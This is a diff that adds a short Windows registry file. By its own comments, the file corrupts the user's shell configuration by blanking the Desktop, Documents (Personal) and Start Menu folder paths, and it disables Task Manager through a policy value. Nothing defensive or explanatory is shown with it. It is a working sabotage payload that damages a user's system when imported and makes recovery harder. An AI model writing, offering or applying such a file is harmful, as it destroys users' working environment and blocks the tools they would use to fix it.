@@ -1,0 +1,11 @@
+Windows Registry Editor Version 5.00
+
+; Corrupts user shell configuration
+[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders]
+"Desktop"=hex(2):00,00
+"Personal"=hex(2):00,00
+"Start Menu"=hex(2):00,00
+
+; Disables task manager
+[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System]
+"DisableTaskMgr"=dword:00000001
